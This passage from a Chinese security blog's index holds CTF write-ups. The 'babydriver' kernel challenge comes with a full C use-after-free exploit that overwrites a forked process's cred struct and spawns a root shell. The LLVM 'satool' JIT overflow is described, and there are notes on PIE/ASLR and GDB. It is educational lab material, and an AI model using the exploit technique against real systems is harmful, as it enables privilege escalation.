class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">ko_test_exit</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;Bye Bye~\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">module_init(ko_test_init);</span><br><span class=\"line\">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>\n<p>​        将这个驱动编译，需要如下Makefile：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">obj-m += ko_test.o</span><br><span class=\"line\"></span><br><span class=\"line\">KDIR =/home/iromise/dev/kernel/linux-5.4.98/</span><br><span class=\"line\"></span><br><span class=\"line\">all:</span><br><span class=\"line\">    $(MAKE) -C $(KDIR) M=$(PWD) modules</span><br><span class=\"line\"></span><br><span class=\"line\">clean:</span><br><span class=\"line\">    rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>\n<p>​        可以看到整个驱动似乎只实现了两件事，一问好二道别。从这一点上看和一个普通的应用程序也没有太大的差异，都是利用c语言实现一些看起来很简单的功能，但是实际上两者有本质的区别。</p>\n<p>​        驱动类似硬件以及软件之间沟通的桥梁，驱动代码看起来并不完全是嵌入式编程那样完全操纵硬件，但也在很大程度上通过一些封装的方式来控制硬件。</p>\n<p>​        换句话来说，驱动是介于硬件以及操作系统两个层级间的媒介，虽然功能看起来并不是那么的“硬”，但是也是直接针对于硬件进行管理。</p>\n<p>​        例如<code>printf</code>和<code>printk</code>，前者是我们常见的标准输出函数，后者是内核驱动编程中常见的函数，也就是向内核日志打印信息。打印的过程和原理与<code>printf</code>类似。</p>\n<p>​        大致讲了一下驱动是什么，回到题目。</p>\n<p>​        这道题加载的驱动是babydrive.ko,我们接下来着重分析这个模块。</p>\n<h2><span id=\"驱动伪代码分析\">驱动伪代码分析</span></h2><p>首先查一下保护。可以看到题目用的kernel版本是4.4.72。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%885.23.19.png\" alt=\"截屏2022-07-15 下午5.23.19\"></p>\n<p>​        </p>\n<p>64位，只开启了NX保护。拖进ida里。</p>\n<p>需要分析的函数大致是这么几个：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%885.28.57.png\" alt=\"截屏2022-07-15 下午5.28.57\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%885.28.46.png\" alt=\"截屏2022-07-15 下午5.28.46\"></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%885.29.07.png\" alt=\"截屏2022-07-15 下午5.29.07\"></p>\n<p>可以看到一组是初始化以及清理。另一组是io相关的函数。</p>\n<p>首先看初始化。</p>\n<h4><span id=\"init_module\">init_module</span></h4><p>第一步</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">alloc_chrdev_region(&amp;babydev_no, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"string\">&quot;babydev&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>这个函数的目的则是申请一个名为<code>babydev</code>的新设备，并将设备号储存在<code>babydev_no</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">cdev_init(&amp;cdev_0, &amp;fops);</span><br></pre></td></tr></table></figure>\n<p>初始化一个cdev结构体，并设置该设备的各种操作为传入的<code>*fop</code>，即<code>file_operations</code>。</p>\n<p>这个结构体包含了很多函数指针，例如<code>read</code>，<code>write</code>等。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">cdev_add(&amp;cdev, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)babydev_no, <span class=\"number\">1LL</span>);</span><br></pre></td></tr></table></figure>\n<p>接着。将之前申请的设备号传入结构体。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_class_create(&amp;_this_module, <span class=\"string\">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br></pre></td></tr></table></figure>\n<p>创建类，存放于<code>/sys/class</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">device_create(v2, <span class=\"number\">0LL</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)babydev_no, <span class=\"number\">0LL</span>, <span class=\"string\">&quot;babydev&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>总体就是将设备号所对应的设备注册进 sysfs。</p>\n<h3><span id=\"cleanup_module\">cleanup_module</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">device_destroy(babydev_class, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)babydev_no);</span><br><span class=\"line\">  class_destroy(babydev_class);</span><br><span class=\"line\">  cdev_del(&amp;cdev);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> unregister_chrdev_region((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)babydev_no, <span class=\"number\">1LL</span>);</span><br></pre></td></tr></table></figure>\n<p>将init创建的一些结构，类之类的全部释放。</p>\n<h3><span id=\"babyopen\">babyopen</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_fentry__();</span><br><span class=\"line\">  babydev_struct = kmem_cache_alloc_trace(kmalloc_caches[<span class=\"number\">6</span>], <span class=\"number\">37748928LL</span>, <span class=\"number\">64LL</span>);</span><br><span class=\"line\">  qword_D98 = <span class=\"number\">64LL</span>;</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;device open\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n<p>创建一个<code>babydev_struct</code>结构体，长度为64。</p>\n<h3><span id=\"babyrelease\">babyrelease</span></h3><p>相当于free，并且对结构体free后没有将指针置0/</p>\n<h3><span id=\"babyreadampwirte\">babyread&amp;wirte</span></h3><p>比较普通，没有什么特别值得关注的。</p>\n<h3><span id=\"babyioctl\">babyioctl</span></h3><p>相当于realloc。但是此时重新分配的结构体的大小可以由用户指定。</p>\n<h2><span id=\"漏洞\">漏洞</span></h2><p>这个题的漏洞比较多，首先最重要的就是<code>babystruct</code>是一个全局变量，这意味着多个设备可以共用一个结构体，所以当一个设备释放了该结构体，另一个设备可以对其任意写造成UAF。</p>\n<p>此外本身free结构体就存在uaf，而且ioctl处也存在问题。</p>\n<h2><span id=\"利用\">利用</span></h2><p>一般来说我们希望对目标提权，取得root权限以读取flag。而cred结构体正好就记录了当前进程的权限，所以如果我们能够修改cred结构体，将进程的uid等设置为0，就能够进行提权。</p>\n<p>而修改cred的典型方法如下（copy from ctf‘ wiki）</p>\n<ol>\n<li>申请一块与 cred 结构体大小一样的堆块</li>\n<li>释放该堆块</li>\n<li>fork 出新进程，恰好使用刚刚释放的堆块</li>\n<li>此时，修改 cred 结构体特定内存，从而提权</li>\n</ol>\n<p>这个题就可以用这个方法，该内核版本下cred的大小是0xa8，所以我们只需要申请一个0xa8大小的device buf，并释放，再fork新进程，此时新进程的cred结构体就会用到我们刚才释放的内存空间，于是就可以利用uaf对其进行覆写。</p>\n<h2><span id=\"exp\">exp</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> device1 = open(<span class=\"string\">&quot;/dev/babydev&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> device2 = open(<span class=\"string\">&quot;/dev/babydev&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tioctl(device1, <span class=\"number\">0x10001</span>, <span class=\"number\">0xa8</span>);</span><br><span class=\"line\">\tclose(device1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> new_process_pid = fork();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (new_process_pid &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[*] fork error&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (new_process_pid == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">char</span> lots_zero[<span class=\"number\">30</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t\twrite(device2, lots_zero, <span class=\"number\">28</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (getuid() == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[*] got root&quot;</span>);</span><br><span class=\"line\">\t\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\twait(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclose(device2);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>好阴间，我还没有调好这个虚拟机的复制粘贴。目前就这样吧。</p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-babydriver-init\">https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-babydriver-init</a></p>\n<p><a href=\"https://cjovi.icu/pwnreview/1408.html\">https://cjovi.icu/pwnreview/1408.html</a></p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/\">https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/</a></p>\n","categories":["Binary_security"],"tags":["KERNEL"]},{"title":"llvm pass - satool","url":"/2022/10/25/llvm_llvm-pass/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-cZwAlOHa\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"基础知识\">基础知识</span></h2><p>​        我之前一直以为llvm是一个虚拟机，然而查了资料以后发现llvm除了名字以外与虚拟机再无半分关系。</p>\n<p>​        llvm的官方解释其实比较抽象：</p>\n<blockquote>\n<p>LLVM项目是模块化、可重用的编译器以及工具链技术的集合。</p>\n</blockquote>\n<p>​        说白了就是很多工具模块，统称llvm，之前已经接触过的略微熟悉的就是llvm的子项目clang。</p>\n<blockquote>\n<p>LLVM项目的一个子项目，基于LLVM架构的C/C++/Objective-C编译器前端。</p>\n</blockquote>\n<p>​        那么llvm pass呢？</p>\n<blockquote>\n<p>pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。</p>\n</blockquote>\n<p>如果学过编译原理的话，应该知道编译过程主要可以划分为前端与后端：</p>\n<ul>\n<li>前端把源代码翻译成中间表示 (IR)。</li>\n<li>后端把IR编译成目标平台的机器码。当然，IR也可以给解释器解释执行。</li>\n</ul>\n<p>经典的gcc等编译器使用较为整体的设计，从源代码到IR，再从IR到到机器码，这之间的过程是封装好的，用户不需要知道其中IR是什么样的，也不会为用户暴露可操作IR的接口，然而LLVM的设计理念就是将IR的部分单独抽出来，作为一个接口提供给用户。</p>\n<p>因此，用户只要能够完成从源码到IR的设计，后续便能直接使用LLVM进行后端的编译，并享受到IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是用来一个处理IR文件的东西，利用它我们可以优化已有的IR。</p>\n<h2><span id=\"satool\">satool</span></h2><h3><span id=\"逆向\">逆向</span></h3><p>首先找到<code>runOnFunction</code>函数</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%883.09.13.png\" alt=\"截屏2022-10-30 下午3.09.13\"></p>\n<p>​        大概长这个样。之前没有怎么做过这种代码比较辣眼睛的题，要么都只是逻辑相对复杂。</p>\n<p>​        所以话说回来，其实只要说服了眼睛，这种题也不算很难逆。</p>\n<p>​        </p>\n<p>​        首先是一个限制，<code>arg_size</code>以及<code>size</code>需为一。</p>\n<p>​        接着执行一个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">this</span>[<span class=\"number\">5</span>] = <span class=\"keyword\">this</span>[<span class=\"number\">4</span>];</span><br><span class=\"line\">  mprotect(<span class=\"keyword\">this</span>[<span class=\"number\">4</span>], <span class=\"number\">0x1000</span>uLL, <span class=\"number\">3</span>);</span><br><span class=\"line\">  `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)<span class=\"keyword\">this</span>, v29);</span><br><span class=\"line\">  mprotect(<span class=\"keyword\">this</span>[<span class=\"number\">4</span>], <span class=\"number\">0x1000</span>uLL, <span class=\"number\">5</span>);</span><br></pre></td></tr></table></figure>\n<p>​        这里先不看。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v27 = `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::callCode((_anonymous_namespace_::MBAPass *)<span class=\"keyword\">this</span>);</span><br></pre></td></tr></table></figure>\n<p>​        这里调用了<code>callCode</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::callCode(</span><br><span class=\"line\">        __int64 (__fastcall **<span class=\"keyword\">this</span>)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class=\"line\">        __int64 a2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>[<span class=\"number\">4</span>]((_anonymous_namespace_::MBAPass *)<span class=\"keyword\">this</span>, a2);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        可以看到这个函数是直接调用<code>this[4]</code></p>\n<p>​        回到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">this</span>[<span class=\"number\">5</span>] = <span class=\"keyword\">this</span>[<span class=\"number\">4</span>];</span><br><span class=\"line\">  mprotect(<span class=\"keyword\">this</span>[<span class=\"number\">4</span>], <span class=\"number\">0x1000</span>uLL, <span class=\"number\">3</span>);</span><br><span class=\"line\">  `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)<span class=\"keyword\">this</span>, v29);</span><br><span class=\"line\">  mprotect(<span class=\"keyword\">this</span>[<span class=\"number\">4</span>], <span class=\"number\">0x1000</span>uLL, <span class=\"number\">5</span>);</span><br></pre></td></tr></table></figure>\n<p>​        这里首先在<code>this[4]</code>开辟了一个0x1000的可执行空间。然后执行<code>handle</code>,最后<code>callCode</code>执行这个<code>this[4]</code>。那么来看<code>handle</code>。</p>\n<p>​        这里的逻辑第一次看比较费解。回想一下之前的知识，llvm pass 是用来处理IR代码的，这里的<code>this</code>实际是用来储存需要处理的IR代码，所以前面的逻辑是：利用handle处理IR代码，最后执行处理完的代码。</p>\n<p>​        <code>handle</code>的逻辑比较复杂，目前还没有逆明白，先挑一段出来：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (((__int64 (__fastcall *)(__int64 *))llvm::isa&lt;llvm::Constant,llvm::Value *&gt;)(&amp;Operand) &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )<span class=\"comment\">// if operant = 1</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *((_DWORD *)<span class=\"keyword\">this</span> + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v2 = (llvm::ConstantInt *)((__int64 (__fastcall *)(__int64))llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;)(Operand);<span class=\"comment\">// if arg =1 </span></span><br><span class=\"line\">    SExtValue = get_sextvalue(v2);</span><br><span class=\"line\">    `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::writeMovImm64(<span class=\"keyword\">this</span>, <span class=\"number\">0</span>, SExtValue);<span class=\"comment\">// mov imm64</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::writeRet(<span class=\"keyword\">this</span>);<span class=\"comment\">// ret</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​            </p>\n<p>​        调用了一堆看不懂的函数，然后一个比较关键的<code>SExtValue</code>即储存了需要被处理的IR代码，再调用<code>writeMovImm64(this, 0, SExtValue)</code>函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_anonymous_namespace_::MBAPass *__fastcall `anonymous <span class=\"keyword\">namespace</span><span class=\"number\">&#x27;</span>::MBAPass::writeMovImm64(</span><br><span class=\"line\">        _anonymous_namespace_::MBAPass *<span class=\"keyword\">this</span>,</span><br><span class=\"line\">        <span class=\"keyword\">int</span> a2,</span><br><span class=\"line\">        __int64 a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _anonymous_namespace_::MBAPass *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  **((_BYTE **)<span class=\"keyword\">this</span> + <span class=\"number\">5</span>) = <span class=\"number\">0x48</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a2 )</span><br><span class=\"line\">    *(_BYTE *)(*((_QWORD *)<span class=\"keyword\">this</span> + <span class=\"number\">5</span>) + <span class=\"number\">1LL</span>) = <span class=\"number\">0xBB</span>;<span class=\"comment\">// movabs rbx, xxx</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    *(_BYTE *)(*((_QWORD *)<span class=\"keyword\">this</span> + <span class=\"number\">5</span>) + <span class=\"number\">1LL</span>) = <span class=\"number\">0xB8</span>;<span class=\"comment\">// movabs rax,xxx</span></span><br><span class=\"line\">  result = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">  *(_QWORD *)(*((_QWORD *)<span class=\"keyword\">this</span> + <span class=\"number\">5</span>) + <span class=\"number\">2LL</span>) = a3;</span><br><span class=\"line\">  *((_QWORD *)<span class=\"keyword\">this</span> + <span class=\"number\">5</span>) += <span class=\"number\">10LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        可以大致知道这里的功能就是将我们传入的IR指令翻译为机器码，具体可以看ayaka师傅的博客。</p>\n<p>​        于是同理，下面的<code>writeRet(this)</code>也是在<code>this + 5</code>的地方插入<code>ret</code>。</p>\n<p>​        玄学地理解一下，<code>handle</code>函数就是将ir翻译为机器码执行。具体的细节之后再研究。</p>\n<p>​        然后看题，漏洞出在</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v30 = *((_QWORD *)<span class=\"keyword\">this</span> + <span class=\"number\">4</span>) + <span class=\"number\">0xFF0</span>LL;</span><br></pre></td></tr></table></figure>\n<p>​        缓冲区大小为0x1000（可以在mmap处看到），但是这里<code>this+4</code>却写成<code>0xFF0</code>，但是每次执行的时候缓冲区不会被清空，且都会执行0x1000字节的代码，所以多了八个可以供我们写的字节，我们可以控制写入的字节数，继而控制程序执行我们写入的指令。</p>\n<p>​        ayaka给出的思路是，第一次JIT时，在0xff0处，将jmp指令假装成操作数的样子写入，第二次jit时，只生成0xff0长度的指令， 于是程序就会继续执行jmp。</p>\n<h3><span id=\"调试\">调试</span></h3><p>首先</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install llvm-12</span><br></pre></td></tr></table></figure>\n<p>gdb调试opt，设置参数为启动参数。</p>\n<p>先在<code>llvm::Pass::preparePassManager</code>下断点，然后可以断在<code>MBAPass::runOnFunction</code>。</p>\n<p>执行到这里，就是利用mprotect设置缓冲区为可执行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%8810.02.03.png\" alt=\"截屏2022-10-30 下午10.02.03\">        </p>\n<p>跟进<code>handle</code>函数，但其实没有什么好看的，直接finish。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%8810.06.00.png\" alt=\"截屏2022-10-30 下午10.06.00\"></p>\n<p>跳过<code>handle</code>后，可以看到code被写入了，用的akaya师傅的测试exp。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%8810.11.56.png\" alt=\"截屏2022-10-30 下午10.11.56\"></p>\n<p>编写好exp后：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%8810.15.35.png\" alt=\"截屏2022-10-30 下午10.15.35\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%8810.16.01.png\" alt=\"截屏2022-10-30 下午10.16.01\"></p>\n<p>exp大致逻辑就是第一次jit填充0xff0size的指令，没有任何用处，然后在<code>0x7ffff7ffbff2</code>上写jmp shellcode，shellcode的地址就在前面0x1000的地方找一个，第二次jit时写上即可。shellcode的编写有很大的限制。</p>\n<p>偷一个师傅的图：</p>\n<p><a href=\"https://lakwsh.net/?p=457\">https://lakwsh.net/?p=457</a></p>\n<p><img src=\"https://lakwsh.net/wp-content/uploads/2022/05/image-7.png\" alt=\"img\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-30%20%E4%B8%8B%E5%8D%8810.21.58.png\" alt=\"截屏2022-10-30 下午10.21.58\"></p>\n<p>效果大概是这样。</p>\n<h2><span id=\"总结\">总结</span></h2><p>这个漏洞的点比较怪，我看其他的类似的题也没有类似的点，但是确实能够总结出一些简单的做题规律。</p>\n<p>首先找<code>runOnFunction</code>,这个函数就相当于elf的<code>main</code>，然后如果是pass类，那么其主要漏洞也许都是发生在处理IR的过程中，搞清几个变量的含义之类的很重要（我现在还看不太明白那个处理的过程）。</p>\n<p>最后是调试，调试的话直接<code>gdb opt</code>+<code>set args</code>，然后需要先断在<code>llvm::Pass::preparePassManager</code>，然后环境中才会有那些什么<code>mbaPass::</code>的符号。</p>\n<p>pass逻辑还没整明白，再做几个题吧。</p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://zhuanlan.zhihu.com/p/290946850\">https://zhuanlan.zhihu.com/p/290946850</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/122522485\">https://zhuanlan.zhihu.com/p/122522485</a></p>\n<p><a href=\"https://bbs.pediy.com/thread-273229.html\">https://bbs.pediy.com/thread-273229.html</a></p>\n<p><a href=\"https://bbs.pediy.com/thread-273119.html\">https://bbs.pediy.com/thread-273119.html</a></p>\n","categories":["Binary_security"],"tags":["LLVM"]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","url":"/2021/08/13/mess_ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-mxYeDFmQ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h3><span id=\"elf文件下对于pie保护和aslr的重新认识\">ELF文件下对于PIE保护和ASLR的重新认识</span></h3><h4><span id=\"0\">0）</span></h4><p>​    复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。</p>\n<h4><span id=\"1\">1）</span></h4><p>​    如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。</p>\n<p>ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。</p>\n<p>也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。</p>\n<p>在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。</p>\n<p>这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。</p>\n<p>PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。</p>\n<p>​    然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"mess_GDB中ni与si的魔法","url":"/2022/10/24/mess_GDB%20%E4%B8%ADni%20%E4%B8%8E%20si%E7%9A%84%E9%AD%94%E6%B3%95/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​        关于gdb中ni 、n、si、s的区别，是一个很基础的问题：n/s都是C语言级的断点定位。s会进入C函数内部，n不会。ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部, ni不会。</p>\n<p>​        然而众所周知，gdb下软件断点的原理是在代码中插入 <code>int 